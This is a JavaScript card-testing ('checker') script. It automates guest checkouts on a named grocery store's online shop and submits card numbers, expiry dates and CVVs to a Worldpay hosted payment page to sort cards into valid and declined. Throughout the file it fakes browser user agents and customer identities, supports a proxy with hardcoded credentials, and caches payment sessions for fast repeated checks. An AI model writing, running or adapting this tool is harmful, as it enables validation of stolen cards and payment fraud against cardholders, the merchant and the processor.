const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs').promises;
const path = require('path');

// Configuración del proxy
const USE_PROXY = false; // true/false para activar/desactivar proxy
const PROXY_CONFIG = "geo.spyderproxy.com:32325:cBYTJIAcgE:yhajRdMWUg_country-us";
const SESSION_CACHE_FILE = "session_cache.json";

class SessionCache {
    constructor(cacheFile = SESSION_CACHE_FILE) {
        this.cacheFile = cacheFile;
        this.sessions = {};
        this.loadCache();
    }

    async loadCache() {
        try {
            if (await this.fileExists(this.cacheFile)) {
                const data = await fs.readFile(this.cacheFile, 'utf8');
                this.sessions = JSON.parse(data);
                console.log(`[CACHE] Loaded ${Object.keys(this.sessions).length} cached sessions`);
            }
        } catch (error) {
            console.log(`[CACHE] Error loading cache: ${error.message}`);
            this.sessions = {};
        }
    }

    async saveCache() {
        try {
            await fs.writeFile(this.cacheFile, JSON.stringify(this.sessions, null, 2));
            console.log(`[CACHE] Saved ${Object.keys(this.sessions).length} sessions to cache`);
        } catch (error) {
            console.log(`[CACHE] Error saving cache: ${error.message}`);
        }
    }

    async fileExists(filePath) {
        try {
            await fs.access(filePath);
            return true;
        } catch {
            return false;
        }
    }

    getSession(storeId = 1021) {
        const storeKey = storeId.toString();
        if (this.sessions[storeKey]) {
            const session = this.sessions[storeKey];
            // Check if session is still valid (less than 30 minutes old)
            if (Date.now() - (session.timestamp || 0) < 1800000) {
                console.log("[CACHE] Using cached session");
                return session;
            } else {
                console.log("[CACHE] Cached session expired");
                delete this.sessions[storeKey];
            }
        }
        return null;
    }

    async saveSession(storeId, sessionData) {
        const storeKey = storeId.toString();
        sessionData.timestamp = Date.now();
        this.sessions[storeKey] = sessionData;
        await this.saveCache();
        console.log("[CACHE] Session saved for reuse");
    }
}

function parseCard(card) {
    const matches = card.match(/\d+/g);
    if (!matches || matches.length < 4) {
        throw new Error("Card format is incorrect. Expected format: card_number|exp_month|exp_year|cvv");
    }
    const [cardNumber, expMonth, expYear, cvv] = matches.slice(0, 4);
    return { cardNumber, expMonth, expYear, cvv };
}

function generateFakeUserAgent() {
    const versions = ['120.0.0.0', '119.0.0.0', '118.0.0.0'];
    const version = versions[Math.floor(Math.random() * versions.length)];
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
}

function generateFakeUserData() {
    const firstNames = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Lisa', 'Chris', 'Emma'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    const randomNum = Math.floor(Math.random() * 999) + 1;
    const phone = `${Math.floor(Math.random() * 900) + 100}${Math.floor(Math.random() * 9000000) + 1000000}`;
    
    return {
        firstName,
        lastName,
        email: `${firstName.toLowerCase()}${lastName.toLowerCase()}${randomNum}@${domain}`,
        phone
    };
}

function createAxiosInstance() {
    const userAgent = generateFakeUserAgent();
    
    const config = {
        timeout: 10000,
        headers: {
            'User-Agent': userAgent,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Connection': 'keep-alive'
        }
    };

    if (USE_PROXY && PROXY_CONFIG) {
        const [host, port, username, password] = PROXY_CONFIG.split(':');
        config.proxy = {
            protocol: 'http',
            host: host,
            port: parseInt(port),
            auth: {
                username: username,
                password: password
            }
        };
        console.log(`[PROXY] Using proxy: ${host}:${port}`);
    } else {
        console.log("[PROXY] Proxy disabled - using direct connection");
    }

    return axios.create(config);
}

async function requestWithRetry(requestFunc, attempts = 3, delay = 1000) {
    for (let attempt = 1; attempt <= attempts; attempt++) {
        try {
            return await requestFunc();
        } catch (error) {
            console.log(`[RETRY] RETRYING LAST REQUEST... ${attempt}/${attempts}`);
            if (attempt < attempts) {
                await new Promise(resolve => setTimeout(resolve, delay));
            } else {
                throw error;
            }
        }
    }
}

async function verifyCardWithCachedSession(cardNumber, expMonth, expYear, cvv, cachedSession) {
    const axios = createAxiosInstance();
    
    console.log("[CACHE] Using cached session for quick verification");
    
    try {
        const response = await requestWithRetry(async () => {
            return await axios.post(
                `https://transaction.hostedpayments.com/?TransactionSetupId=${cachedSession.transaction_id}`,
                new URLSearchParams({
                    "scriptManager": "upFormHP|processTransactionButton",
                    "__EVENTTARGET": "processTransactionButton",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": cachedSession.viewstate,
                    "__VIEWSTATEGENERATOR": cachedSession.viewstategenerator,
                    "__VIEWSTATEENCRYPTED": "",
                    "__EVENTVALIDATION": cachedSession.eventvalidation,
                    "hdnCancelled": "",
                    "errorParms": "",
                    "eventPublishTarget": "",
                    "cardNumber": cardNumber,
                    "ddlExpirationMonth": expMonth.padStart(2, '0'),
                    "ddlExpirationYear": expYear.length === 2 ? expYear : expYear.slice(-2),
                    "CVV": cvv.padStart(3, '0'),
                    "hdnSwipe": "",
                    "hdnTruncatedCardNumber": "",
                    "hdnValidatingSwipeForUseDefault": "",
                    "hdnEncoded": "",
                    "__ASYNCPOST": "true",
                    "": ""
                }).toString(),
                {
                    headers: {
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "dnt": "1",
                        "origin": "https://transaction.hostedpayments.com",
                        "pragma": "no-cache",
                        "priority": "u=1, i",
                        "referer": `https://transaction.hostedpayments.com/?TransactionSetupId=${cachedSession.transaction_id}`,
                        "user-agent": cachedSession.user_agent,
                        "x-microsoftajax": "Delta=true",
                        "x-requested-with": "XMLHttpRequest"
                    },
                    timeout: 6000
                }
            );
        });

        if (response.status !== 200) {
            console.log(`[FAST ERROR] Request failed with status code: ${response.status}`);
            console.log("[FAST] Falling back to full flow...");
            return null;
        }

        const $ = cheerio.load(response.data);
        const errorSpan = $('span.error');

        if (errorSpan.length > 0) {
            const errorText = errorSpan.text();
            const errorMessage = errorText.includes(': ') ? errorText.split(': ')[1] : errorText;

            if (errorMessage.includes('CVV2')) {
                return { status: 'approved', message: errorMessage };
            } else {
                return { status: 'declined', message: errorMessage };
            }
        } else {
            return { status: 'approved', message: 'Card added successfully.' };
        }

    } catch (error) {
        console.log(`[FAST ERROR] Failed to use cached session: ${error.message}`);
        return null;
    }
}

async function worldpayAuth(cardNumber, expMonth, expYear, cvv, sessionCache) {
    const axios = createAxiosInstance();
    const userData = generateFakeUserData();
    const userAgent = axios.defaults.headers['User-Agent'];
    let reqNum = 0;

    try {
        // REQ 1: POST to get cart_id
        reqNum = 1;
        console.log(`[REQ ${reqNum}] Creating cart...`);
        
        const cartResponse = await requestWithRetry(async () => {
            return await axios.post(
                "https://production-us-1.noq-servers.net/api/v1/application/carts",
                {
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 0,
                    "AllowUnattendedDelivery": false,
                    "IsEligibleForFreeDelivery": false,
                    "IsEligibleForFreePickup": false,
                    "IsFulfillmentTaxed": false,
                    "IsGuest": true,
                    "IsOfflinePayment": false,
                    "PaymentSourceId": null,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": null,
                    "StoreId": 1021,
                    "TimeSlot": null,
                    "GiftMessage": null,
                    "EnabledPaymentTypes": [],
                    "Version": 0,
                    "IsTipLimited": false,
                    "VoucherTotal": 0,
                    "HasDeals": false,
                    "AllowAdditionalAuth": false,
                    "Reference": "",
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 0,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": "CreditCard",
                    "ContainsAlcohol": false,
                    "ContainsTobacco": false,
                    "IsOverMaxSpend": false,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 0,
                    "PickingAllowanceVariationAmount": 0,
                    "Recipient": null,
                    "TaxIncluded": false,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0
                },
                {
                    headers: {
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 6000
                }
            );
        });

        if (cartResponse.status !== 200) {
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${cartResponse.status}`);
            return null;
        }

        const cartId = cartResponse.data?.Result?.Reference;
        if (!cartId) {
            console.log(`[REQ ${reqNum} ERROR] Failed to get cart ID`);
            return null;
        }

        // REQ 2: PUT to add object to cart
        reqNum = 2;
        console.log(`[REQ ${reqNum}] Adding item to cart...`);
        
        const addItemResponse = await requestWithRetry(async () => {
            return await axios.put(
                `https://production-us-1.noq-servers.net/api/v1/application/carts/${cartId}/update-items`,
                [{
                    "Reference": "",
                    "ProductId": "c14098c3-b24b-4e95-8bcb-b18d01151836",
                    "CartItemId": "94a066e6-036f-46a5-b128-ea0f007829fa",
                    "OrderedQuantity": 1,
                    "Note": "",
                    "CanSubstitute": true,
                    "FrequencyWeeks": null,
                    "RecurringOrderId": null,
                    "ProductOptions": [],
                    "ShippingAddress": null,
                    "Instructions": null,
                    "GiftMessage": null,
                    "IsProductMissing": false,
                    "Origin": null,
                    "OriginId": null,
                    "RequestedProductName": "",
                    "IsWeighted": false,
                    "PricePerUnit": 0,
                    "PreferredSubstitutionIds": []
                }],
                {
                    headers: {
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 6000
                }
            );
        });

        if (addItemResponse.status !== 200) {
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${addItemResponse.status}`);
            // Si es 500, intentamos continuar con el flujo ya que el carrito puede estar creado
            if (addItemResponse.status === 500) {
                console.log(`[REQ ${reqNum}] Status 500 detected, continuing with flow...`);
            } else {
                return null;
            }
        }

        // REQ 3: GET to get timeslots
        reqNum = 3;
        console.log(`[REQ ${reqNum}] Getting timeslots...`);
        
        const timeslotsResponse = await requestWithRetry(async () => {
            return await axios.get(
                "https://production-us-1.noq-servers.net/api/v1/application/stores/1021/timeslots",
                {
                    headers: {
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    params: {
                        "DeliveryDistance": 0,
                        "DeliveryStreetAddress": "",
                        "AllowUnattendedDelivery": false,
                        "IsEligibleForFreeDelivery": false,
                        "IsEligibleForFreePickup": false,
                        "IsFulfillmentTaxed": false,
                        "IsGuest": true,
                        "IsOfflinePayment": false,
                        "PaymentSourceId": null,
                        "FulfillmentAreaId": 1986,
                        "ShippingAddress": null,
                        "StoreId": 1021,
                        "TimeSlot": JSON.stringify({
                            "Start": "2025-08-29T15:00:00-05:00",
                            "Id": "77555877-3fd1-43f0-a719-b18d014a7f95"
                        }),
                        "GiftMessage": null,
                        "EnabledPaymentTypes": JSON.stringify([
                            {"Type": "CreditCard", "IsAllowed": true, "Reason": ""}
                        ]),
                        "Version": 2,
                        "IsTipLimited": false,
                        "HasDeals": false,
                        "AllowAdditionalAuth": false,
                        "Reference": cartId,
                        "BagAllowance": 0,
                        "Deposit": 0,
                        "FulfillmentMethod": "Pickup",
                        "MaxSnapAmount": 0,
                        "PayWithSnapAmount": 0,
                        "Instructions": "",
                        "PaymentType": null,
                        "ContainsAlcohol": false,
                        "ContainsTobacco": false,
                        "IsOverMaxSpend": false,
                        "LoyaltyMembershipNumber": "",
                        "Recipient": null,
                        "TaxIncluded": false,
                        "TippingPercentage": 0
                    },
                    timeout: 6000
                }
            );
        });

        if (timeslotsResponse.status !== 200) {
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${timeslotsResponse.status}`);
            return null;
        }

        // Find open slot
        let idValue = null;
        let startValue = null;
        
        const pickupLocations = timeslotsResponse.data?.Result?.PickupLocations || [];
        for (const location of pickupLocations) {
            if (location.Id === 1986) {
                const timeSlots = location.TimeSlots || [];
                const openSlot = timeSlots.find(slot => slot.Availability === "Open");
                if (openSlot) {
                    idValue = openSlot.Id;
                    startValue = openSlot.Start;
                    break;
                }
            }
        }

        if (!idValue || !startValue) {
            console.log(`[REQ ${reqNum} ERROR] No open timeslots available.`);
            return null;
        }

        // REQ 4: PUT timeslot
        reqNum = 4;
        const putTimeslotResponse = await requestWithRetry(async () => {
            return await axios.put(
                `https://production-us-1.noq-servers.net/api/v1/application/carts/${cartId}`,
                {
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "AllowUnattendedDelivery": false,
                    "IsEligibleForFreeDelivery": false,
                    "IsEligibleForFreePickup": false,
                    "IsFulfillmentTaxed": false,
                    "IsGuest": true,
                    "IsOfflinePayment": false,
                    "PaymentSourceId": null,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": null,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": startValue,
                        "Id": idValue
                    },
                    "GiftMessage": null,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": true, "Reason": ""}
                    ],
                    "Version": 2,
                    "IsTipLimited": false,
                    "HasDeals": false,
                    "AllowAdditionalAuth": false,
                    "Reference": cartId,
                    "BagAllowance": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": null,
                    "ContainsAlcohol": false,
                    "ContainsTobacco": false,
                    "IsOverMaxSpend": false,
                    "LoyaltyMembershipNumber": "",
                    "Recipient": null,
                    "TaxIncluded": false,
                    "TippingPercentage": 0
                },
                {
                    headers: {
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 6000
                }
            );
        });

        if (putTimeslotResponse.status !== 200) {
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${putTimeslotResponse.status}`);
            return null;
        }

        // REQ 5: PUT to set name, email and phone
        reqNum = 5;
        const userDataResponse = await requestWithRetry(async () => {
            return await axios.put(
                `https://production-us-1.noq-servers.net/api/v1/application/carts/${cartId}`,
                {
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 15,
                    "AllowUnattendedDelivery": false,
                    "IsEligibleForFreeDelivery": false,
                    "IsEligibleForFreePickup": false,
                    "IsFulfillmentTaxed": false,
                    "IsGuest": true,
                    "IsOfflinePayment": false,
                    "PaymentSourceId": null,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": null,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": startValue,
                        "Id": idValue
                    },
                    "GiftMessage": null,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": true, "Reason": ""}
                    ],
                    "Version": 3,
                    "IsTipLimited": false,
                    "VoucherTotal": 0,
                    "HasDeals": false,
                    "AllowAdditionalAuth": false,
                    "Reference": cartId,
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 16.2,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": null,
                    "ContainsAlcohol": false,
                    "ContainsTobacco": false,
                    "IsOverMaxSpend": false,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 1,
                    "PickingAllowanceVariationAmount": 0.2,
                    "Recipient": {
                        "CustomerId": 0,
                        "FirstName": userData.firstName,
                        "LastName": userData.lastName,
                        "Email": userData.email,
                        "Phone": userData.phone
                    },
                    "TaxIncluded": false,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0
                },
                {
                    headers: {
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 6000
                }
            );
        });

        if (userDataResponse.status !== 200) {
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${userDataResponse.status}`);
            return null;
        }

        const customerId = userDataResponse.data?.Result?.Recipient?.CustomerId;
        if (customerId === null || customerId === undefined) {
            console.log(`[REQ ${reqNum} ERROR] CustomerId not found`);
            return null;
        }

        // REQ 6: PUT to solve all errors
        reqNum = 6;
        const finalUpdateResponse = await requestWithRetry(async () => {
            return await axios.put(
                `https://production-us-1.noq-servers.net/api/v1/application/carts/${cartId}`,
                {
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 15,
                    "AllowUnattendedDelivery": false,
                    "IsEligibleForFreeDelivery": false,
                    "IsEligibleForFreePickup": false,
                    "IsFulfillmentTaxed": false,
                    "IsGuest": true,
                    "IsOfflinePayment": false,
                    "PaymentSourceId": null,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": null,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": startValue,
                        "Id": idValue
                    },
                    "GiftMessage": null,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": true, "Reason": ""}
                    ],
                    "Version": 4,
                    "IsTipLimited": false,
                    "VoucherTotal": 0,
                    "HasDeals": false,
                    "AllowAdditionalAuth": false,
                    "Reference": cartId,
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 16.2,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": "CreditCard",
                    "ContainsAlcohol": false,
                    "ContainsTobacco": false,
                    "IsOverMaxSpend": false,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 1,
                    "PickingAllowanceVariationAmount": 0.2,
                    "Recipient": {
                        "CustomerId": customerId,
                        "FirstName": userData.firstName,
                        "LastName": userData.lastName,
                        "Email": userData.email,
                        "Phone": userData.phone
                    },
                    "TaxIncluded": false,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0
                },
                {
                    headers: {
                        "content-type": "application/json",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 6000
                }
            );
        });

        if (finalUpdateResponse.status !== 200) {
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${finalUpdateResponse.status}`);
            return null;
        }

        // REQ 7: POST to get transaction ID
        reqNum = 7;
        const transactionResponse = await requestWithRetry(async () => {
            return await axios.post(
                "https://production-us-1.noq-servers.net/api/v1/application/customer/worldpay-payment-transaction-session",
                {
                    "storeId": 1021,
                    "customerId": customerId,
                    "cartReference": cartId,
                    "submitButtonText": "Next",
                    "returnUrl": "https://shop.jimssupervalu.com/assets/savecard-worldpay.html#",
                    "css": "body{background-color:#ffffff;color:#5d5d5d;  font-family:sans-serif!important;  font-size:14px;margin:0;padding-top:7px;}  .divMainForm{min-width:300px!important;padding-top:0px!important;padding-right:0px!important;padding-bottom:0px!important;padding-left:0px!important;}#tableMainForm{border:0;border-collapse:collapse;}#tableCardInformation{border:0;border-collapse:collapse;}#tableManualEntry{border:0;border-collapse:collapse;}#tableTransactionButtons{border:0;border-collapse:collapse;}#tdTransactionButtons{border:0;}  #trTransactionInformation{display:none;}.content{border:0;  padding-top:0px!important;padding-right:0px!important;padding-bottom:0px!important;padding-left:0px!important;}.progressMessage{display:none;}.progressImage{width:50px;height:50px;}  .error{color:#d16262!important;}  .required{display:none;}    .tableErrorMessage{background-color:#fdfadb!important;border-collapse:collapse;border-color:#e3e4e6!important;border-radius:2px!important;border-style:solid;border-width:1px!important;color:inherit!important;font-size:14px!important;font-weight:500!important;margin-bottom:16px!important;  }  .tableTdErrorMessage{background-color:transparent;border-collapse:collapse;padding-bottom:16px!important;padding-left:24px!important;padding-right:24px!important;padding-top:16px!important;}  .tdHeader{display:none;}  .tdLabel{display:block;font-weight:600;line-height:1.5;padding-right:0.5em;text-align:left;}.tdField{display:block;line-height:1.5;padding-bottom:12px;}.inputText{background-color:white;border-color:rgba(0,0,0,0.1);border-radius:2px;box-shadow:none;color:#5d5d5d;font-size:14px;padding-bottom:12px;padding-left:12px;padding-right:12px;padding-top:12px;}  .selectOption{background-color:white;border-color:rgba(0,0,0,0.1);border-radius:2px;box-shadow:none;color:#5d5d5d;font-family:inherit;font-size:14px;line-height:normal;margin:0;}#ddlExpirationMonth{display:inline-block;min-width:6em;padding:8px;}#ddlExpirationYear{display:inline-block;min-width:6em;padding:8px;}    .tdTransactionButtons{line-height:0;}  #submit:link{background-color:#c01e16!important;color:#ffffff!important;border-radius:2px;border:0!important;cursor:pointer!important;display:block!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}#tempButton:link{background-color:green!important;color:white!important;border-radius:2px!important;border:0!important;cursor:pointer!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}#btnCancel:link{background-color:#616161!important;color:white!important;border-radius:2px!important;border:0!important;cursor:pointer!important;display:block!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}",
                    "bd": "1756267583677.EWWClv"
                },
                {
                    headers: {
                        "content-type": "application/json",
                        "dnt": "1",
                        "origin": "https://shop.jimssupervalu.com",
                        "priority": "u=1, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "x-app-environment": "browser",
                        "x-app-version": "v4.13.1"
                    },
                    timeout: 10000
                }
            );
        });

        if (transactionResponse.status !== 200) {
            console.log(transactionResponse.data);
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${transactionResponse.status}`);
            return null;
        }

        const transactionId = transactionResponse.data?.Result;
        if (!transactionId) {
            console.log(`[REQ ${reqNum} ERROR] Failed to get transaction ID`);
            return null;
        }

        // REQ 8: GET to get viewstate, viewstategenerator and eventvalidation
        reqNum = 8;
        const transactionPageResponse = await requestWithRetry(async () => {
            return await axios.get(
                `https://transaction.hostedpayments.com/?TransactionSetupId=${transactionId}`,
                {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "no-cache",
                        "pragma": "no-cache",
                        "priority": "u=0, i",
                        "referer": "https://shop.jimssupervalu.com/",
                        "upgrade-insecure-requests": "1"
                    },
                    timeout: 6000
                }
            );
        });

        if (transactionPageResponse.status !== 200) {
            console.log(transactionPageResponse.data);
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${transactionPageResponse.status}`);
            return null;
        }

        const $ = cheerio.load(transactionPageResponse.data);
        const viewstate = $('input[name="__VIEWSTATE"]').val() || '';
        const viewstategenerator = $('input[name="__VIEWSTATEGENERATOR"]').val() || '';
        const eventvalidation = $('input[name="__EVENTVALIDATION"]').val() || '';

        const sessionData = {
            user_agent: userAgent,
            transaction_id: transactionId,
            viewstate,
            viewstategenerator,
            eventvalidation,
            cookies: {}, // axios doesn't automatically handle cookies like curl_cffi
            cart_id: cartId,
            customer_id: customerId
        };

        await sessionCache.saveSession(1021, sessionData);

        // REQ 9: POST to verify card
        reqNum = 9;
        const verificationResponse = await requestWithRetry(async () => {
            return await axios.post(
                `https://transaction.hostedpayments.com/?TransactionSetupId=${transactionId}`,
                new URLSearchParams({
                    "scriptManager": "upFormHP|processTransactionButton",
                    "__EVENTTARGET": "processTransactionButton",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__VIEWSTATEENCRYPTED": "",
                    "__EVENTVALIDATION": eventvalidation,
                    "hdnCancelled": "",
                    "errorParms": "",
                    "eventPublishTarget": "",
                    "cardNumber": cardNumber,
                    "ddlExpirationMonth": expMonth.padStart(2, '0'),
                    "ddlExpirationYear": expYear.length === 2 ? expYear : expYear.slice(-2),
                    "CVV": cvv.padStart(3, '0'),
                    "hdnSwipe": "",
                    "hdnTruncatedCardNumber": "",
                    "hdnValidatingSwipeForUseDefault": "",
                    "hdnEncoded": "",
                    "__ASYNCPOST": "true",
                    "": ""
                }).toString(),
                {
                    headers: {
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "dnt": "1",
                        "origin": "https://transaction.hostedpayments.com",
                        "pragma": "no-cache",
                        "priority": "u=1, i",
                        "referer": `https://transaction.hostedpayments.com/?TransactionSetupId=750FE01C-E533-4483-8C43-A0370BFE6C1F`,
                        "x-microsoftajax": "Delta=true",
                        "x-requested-with": "XMLHttpRequest"
                    },
                    timeout: 6000
                }
            );
        });

        if (verificationResponse.status !== 200) {
            console.log(verificationResponse.data);
            console.log(`[REQ ${reqNum} ERROR] Request failed with status code: ${verificationResponse.status}`);
            return null;
        }

        const $result = cheerio.load(verificationResponse.data);
        const errorSpan = $result('span.error');

        if (errorSpan.length > 0) {
            const errorText = errorSpan.text();
            const errorMessage = errorText.includes(': ') ? errorText.split(': ')[1] : errorText;

            if (errorMessage.includes('CVV2')) {
                return { status: 'approved', message: errorMessage };
            } else {
                return { status: 'declined', message: errorMessage };
            }
        } else {
            console.log(verificationResponse.data);
            return { status: 'approved', message: 'Card added successfully.' };
        }

    } catch (error) {
        console.log(`[REQ ${reqNum} ERROR] An error occurred: ${error.message}`);
        throw error;
    }
}

async function worldpayAuthWithCache(card, useCache = true) {
    try {
        const { cardNumber, expMonth, expYear, cvv } = parseCard(card);
        const sessionCache = new SessionCache();

        const cachedSession = useCache ? sessionCache.getSession() : null;

        if (cachedSession) {
            const result = await verifyCardWithCachedSession(cardNumber, expMonth, expYear, cvv, cachedSession);
            if (result) {
                return result;
            }
        }

        const result = await worldpayAuth(cardNumber, expMonth, expYear, cvv, sessionCache);
        return result;

    } catch (error) {
        console.log(`[ERROR] ${error.message}`);
        return { status: 'error', message: error.message };
    }
}

module.exports = {
    worldpayAuthWithCache,
    parseCard,
    SessionCache
};
